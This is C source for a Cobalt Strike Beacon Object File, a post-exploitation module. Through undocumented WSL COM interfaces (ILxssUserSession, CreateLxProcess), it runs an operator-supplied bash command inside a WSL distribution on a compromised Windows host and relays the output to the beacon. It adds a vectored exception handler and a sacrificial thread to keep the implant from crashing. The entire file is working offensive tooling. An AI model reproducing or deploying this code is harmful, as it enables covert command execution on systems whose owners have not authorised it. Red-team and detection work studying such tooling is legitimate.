#include <Windows.h>
#include "base\helpers.h"
#define WIN32_LEAN_AND_MEAN  // Exclude rarely-used stuff from Windows headers
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")
#endif
extern "C" {
#define CINTERFACE
#include "beacon.h"
#include "sleepmask.h"
#include "base/helpers.h"
#include "wslservice_h.h"
#include <process.h>
    unsigned __stdcall BeginStub(void* p);

    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
    // Global variables to store the command and distribution name
    char* g_command = NULL;
    wchar_t* g_distributionName = NULL;

    static const GUID CLSID_WslService = {
        0xF122531F,
        0x326B,
        0x4514,
        { 0x85, 0xAE, 0xDC, 0x99, 0xD3, 0x1D, 0x82, 0x56 } };
    static const GUID IID_IWSLService = {
    0x50047071,
    0x122C,
    0x4CAD,
    { 0x9C, 0x93, 0x94, 0x72, 0x0E, 0xB7, 0x7B, 0x06 } };
    static const GUID IID_ILxssUserSession = {
    0x536A6BCF,
    0xFE04,
    0x41D9,
    { 0xB9, 0x78, 0xDC, 0xAC, 0xA9, 0xA9, 0xB5, 0xB9 } };
    static const GUID CLSID_LxssUserSession1 = {
    0x4F476546,
    0xB412,
    0x4579,
    { 0xB6, 0x4C, 0x12, 0x3D, 0xF3, 0x31, 0xE3, 0xD6 } };
    static const GUID IID_ILxssUserSession2 = {
    0x38541BDC,
    0xF54F,
    0x4CEB,
    { 0x85, 0xD0, 0x37, 0xF0, 0xF3, 0xD2, 0x61, 0x7E } };
    static const GUID CLSID_LxssUserSession2 = {
    0xA9B7A1B9,
    0x0671,
    0x405C,
    { 0x95, 0xF1, 0xE0, 0x61, 0x2C, 0xB4, 0xCE, 0x7E } };

    // DFR declarations for WS2_32.dll functions
    DFR(WS2_32, WSAStartup);
    DFR(WS2_32, WSACleanup);
    DFR(WS2_32, ioctlsocket);
    DFR(WS2_32, recv);
    DFR(WS2_32, closesocket);

    // DFR declarations for OLE32.dll functions
    DFR(OLE32, CoInitializeEx);
    DFR(OLE32, CoInitializeSecurity);
    DFR(OLE32, CoCreateInstance);
    DFR(OLE32, CoUninitialize);
    DFR(OLE32, CoTaskMemFree);

    // DFR declarations for KERNEL32.dll functions
    DFR(KERNEL32, Sleep);
    DFR(KERNEL32, WaitForSingleObject);
    DFR(KERNEL32, GetExitCodeProcess);
    DFR(KERNEL32, CloseHandle);
    DFR(KERNEL32, GetLastError);
    DFR(KERNEL32, GetSystemDirectoryA);
    DFR(KERNEL32, HeapAlloc);
    DFR(KERNEL32, HeapFree);
    DFR(KERNEL32, GetProcessHeap);
    DFR(KERNEL32, AddVectoredExceptionHandler);
    DFR(MSVCRT, _endthreadex);
    DFR(MSVCRT, _beginthreadex);
    DFR(KERNEL32, GetExitCodeThread);
    DFR(KERNEL32, RemoveVectoredExceptionHandler);
    // Define statements for WS2_32 functions
#define WSAStartup WS2_32$WSAStartup
#define WSACleanup WS2_32$WSACleanup
#define ioctlsocket WS2_32$ioctlsocket
#define recv WS2_32$recv
#define closesocket WS2_32$closesocket
#define AddVectoredExceptionHandler KERNEL32$AddVectoredExceptionHandler
#define _endthreadex MSVCRT$_endthreadex
#define _beginthreadex MSVCRT$_beginthreadex
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define GetExitCodeThread KERNEL32$GetExitCodeThread
#define RemoveVectoredExceptionHandler KERNEL32$RemoveVectoredExceptionHandler

// Define statements for OLE32 functions
#define CoInitializeEx OLE32$CoInitializeEx
#define CoInitializeSecurity OLE32$CoInitializeSecurity
#define CoCreateInstance OLE32$CoCreateInstance
#define CoUninitialize OLE32$CoUninitialize
#define CoTaskMemFree OLE32$CoTaskMemFree

// Define statements for KERNEL32 functions
#define Sleep KERNEL32$Sleep
#define GetExitCodeProcess KERNEL32$GetExitCodeProcess
#define CloseHandle KERNEL32$CloseHandle
#define GetLastError KERNEL32$GetLastError
#define GetSystemDirectoryA KERNEL32$GetSystemDirectoryA
#define HeapAlloc KERNEL32$HeapAlloc
#define HeapFree KERNEL32$HeapFree
#define GetProcessHeap KERNEL32$GetProcessHeap

// Memory allocation macros
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)
#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)

#define MAKEWORD(a, b) ((WORD)(((BYTE)(((DWORD_PTR)(a)) & 0xff)) | ((WORD)((BYTE)(((DWORD_PTR)(b)) & 0xff))) << 8))
#define FIONBIO 0x8004667e
#define BUFFER_SIZE 4096

    void initializeCom() {
        HRESULT hr;
        ILxssUserSession* session = NULL;
        WSADATA wsaData;
        char* buffer = NULL;

        // Initialize Winsock
        int wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (wsaResult != 0) {
            BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed: %d", wsaResult);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "WSAStartup successful");

        // Initialize COM
        hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08X", hr);
            WSACleanup();
            return;
        }

        // Initialize COM security
        hr = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_STATIC_CLOAKING,
            NULL
        );

        if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
            BeaconPrintf(CALLBACK_ERROR, "CoInitializeSecurity failed: 0x%08X", hr);
        }

        // Create WSL session instance
        hr = CoCreateInstance(CLSID_LxssUserSession2, NULL, CLSCTX_LOCAL_SERVER, IID_ILxssUserSession2, (LPVOID*)&session);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance failed: 0x%08X", hr);
            BeaconPrintf(CALLBACK_ERROR, "Make sure WSL is installed and running");
            CoUninitialize();
            WSACleanup();
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "WSL COM session created successfully");

        if (session) {
            LXSS_ERROR_INFO errorInfo = { 0 };
            GUID distroGuid = { 0 };

            // Get distribution ID
            hr = session->lpVtbl->GetDistributionId(
                session,
                g_distributionName,
                0,
                &errorInfo,
                &distroGuid
            );

            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_ERROR, "GetDistributionId failed: 0x%08X", hr);
                if (errorInfo.Message) {
                    BeaconPrintf(CALLBACK_ERROR, "Error: %S", errorInfo.Message);
                    CoTaskMemFree(errorInfo.Message);
                }
                if (errorInfo.Warnings) {
                    CoTaskMemFree(errorInfo.Warnings);
                }
                session->lpVtbl->Release(session);
                CoUninitialize();
                WSACleanup();
                return;
            }

            BeaconPrintf(CALLBACK_OUTPUT, "Found distro: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
                distroGuid.Data1, distroGuid.Data2, distroGuid.Data3,
                distroGuid.Data4[0], distroGuid.Data4[1], distroGuid.Data4[2],
                distroGuid.Data4[3], distroGuid.Data4[4], distroGuid.Data4[5],
                distroGuid.Data4[6], distroGuid.Data4[7]);

            const char* commandLine[4];
            commandLine[0] = "/bin/bash";
            commandLine[1] = "-c";
            commandLine[2] = g_command;
            commandLine[3] = NULL;

            // Initialize standard handles
            LXSS_STD_HANDLES stdHandles = { 0 };
            stdHandles.StdIn.Handle = 0;
            stdHandles.StdIn.HandleType = LxssHandleConsole;
            stdHandles.StdOut.Handle = 0;
            stdHandles.StdOut.HandleType = LxssHandleConsole;
            stdHandles.StdErr.Handle = 0;
            stdHandles.StdErr.Handle = 0;
            stdHandles.StdErr.HandleType = LxssHandleConsole;

            // Output handles
            GUID distributionId = { 0 };
            GUID instanceId = { 0 };
            HANDLE processHandle = NULL;
            HANDLE serverHandle = NULL;
            SOCKET stdinHandle = NULL;
            SOCKET stdoutHandle = NULL;
            SOCKET stderrHandle = NULL;
            SOCKET commChannel = NULL;
            SOCKET interopSocket = NULL;
            LXSS_ERROR_INFO createError = { 0 };

            // Create the Linux process
            hr = session->lpVtbl->CreateLxProcess(
                session,
                &distroGuid,
                "/bin/bash",
                3,
                commandLine,
                NULL,
                NULL,
                NULL,
                0,
                NULL,
                80,
                25,
                LXSS_HANDLE_USE_CONSOLE,
                &stdHandles,
                0,
                &distributionId,
                &instanceId,
                &processHandle,
                &serverHandle,
                &stdinHandle,
                &stdoutHandle,
                &stderrHandle,
                &commChannel,
                &interopSocket,
                &createError
            );

            if (FAILED(hr)) {
                BeaconPrintf(CALLBACK_ERROR, "CreateLxProcess failed: 0x%08X", hr);
                if (createError.Message) {
                    BeaconPrintf(CALLBACK_ERROR, "Error: %S", createError.Message);
                    CoTaskMemFree(createError.Message);
                }
                if (createError.Warnings) {
                    BeaconPrintf(CALLBACK_ERROR, "Warnings: %S", createError.Warnings);
                    CoTaskMemFree(createError.Warnings);
                }
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "WSL process created successfully!");

                // Allocate buffer on heap
                buffer = (char*)intAlloc(BUFFER_SIZE);
                if (!buffer) {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to allocate buffer");
                    goto cleanup;
                }

                // Read from sockets
                if (stdoutHandle) {
                    // Set socket to non-blocking
                    u_long mode = 1;
                    ioctlsocket((SOCKET)(ULONG_PTR)stdoutHandle, FIONBIO, &mode);

                    // Give process time to produce output
                    Sleep(2000);

                    int bytesRead = 0;
                    int totalBytes = 0;

                    BeaconPrintf(CALLBACK_OUTPUT, "[STDOUT]:");

                    // Read all available data from socket
                    while ((bytesRead = recv((SOCKET)(ULONG_PTR)stdoutHandle,
                        buffer,
                        BUFFER_SIZE - 1,
                        0)) > 0) {
                        buffer[bytesRead] = '\0';
                        totalBytes += bytesRead;
                        BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                    }

                    if (totalBytes == 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "(no output)");
                    }
                    else {
                        BeaconPrintf(CALLBACK_OUTPUT, "\nTotal bytes read: %d", totalBytes);
                    }
                }

                // Wait for process completion
                if (processHandle) {
                    DWORD waitResult = WaitForSingleObject(processHandle, 10000);
                    if (waitResult == WAIT_OBJECT_0) {
                        DWORD exitCode = 0;
                        if (GetExitCodeProcess(processHandle, &exitCode)) {
                            BeaconPrintf(CALLBACK_OUTPUT, "Process exited with code: %d", exitCode);
                        }
                    }
                    else if (waitResult == WAIT_TIMEOUT) {
                        BeaconPrintf(CALLBACK_OUTPUT, "Process still running after timeout");
                    }
                }

            cleanup:
                // Free buffer
                if (buffer) {
                    intFree(buffer);
                    buffer = NULL;
                }

                // Clean up handles
                if (processHandle) CloseHandle(processHandle);
                if (serverHandle) CloseHandle(serverHandle);
                if (stdinHandle) closesocket(stdinHandle);
                if (stdoutHandle) closesocket(stdoutHandle);
                if (stderrHandle) closesocket(stderrHandle);
                if (commChannel) closesocket(commChannel);
                if (interopSocket) closesocket(interopSocket);
            }

            // Release the session
            session->lpVtbl->Release(session);
        }

        // Uninitialize COM
        CoUninitialize();
        WSACleanup();
    }

void go(char* args, int len) {

    datap parser = { 0 };
    DWORD exitcode = 0;
    HANDLE thread = NULL;
    PVOID eHandler = NULL;

    // Parse the arguments
    BeaconDataParse(&parser, args, len);
    g_command = (char*)BeaconDataExtract(&parser, NULL);
    g_distributionName = (wchar_t*)BeaconDataExtract(&parser, NULL);

    if (g_command == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "No command provided\n");
        return;
    }

    if (g_distributionName == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "No distribution name provided\n");
        return;
    }

    //Setup Exception handling
    //RPC uses exceptions to raise errors to the client program. Normally, this is handled using MSVC's extensions for
    //SEH(RpcTryExcept, RpcExcept & RpcEndExcept). An object file loaded with COFFLoader is not set up so that SEH works.
    //To prevent beacon from crashing, we can setup an exception handler to catch exceptions that are unhandled. We will use
    //A sacrificial thread to run our main code, handle any RPC exceptions, and return the error code back to us upon failure.
    //The main thread will be blocked while the sacrificial thread is running.
    eHandler = AddVectoredExceptionHandler(0, (PVECTORED_EXCEPTION_HANDLER)PvectoredExceptionHandler);
    thread = (HANDLE)_beginthreadex(NULL, 0, BeginStub, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
    GetExitCodeThread(thread, &exitcode);
    if (exitcode != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "An exception occured while running: 0x%x\n", exitcode);
    }
    if (thread) { CloseHandle(thread); }
    //if (eHandler) { RemoveVectoredExceptionHandler(eHandler); }
}
    unsigned __stdcall BeginStub (void* p) {
        // Grab parameter values from beacon pars
        BeaconPrintf(CALLBACK_OUTPUT, "Starting WSL BOF...");
        // Initialize COM and execute WSL command
        initializeCom();
        return 0;
    }

    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
    {
        _endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
}
// Define a main function for the debug build
#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    bof::runMocked<>(go, "uname -a", L"Debian");
    return 0;
}
// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>
TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif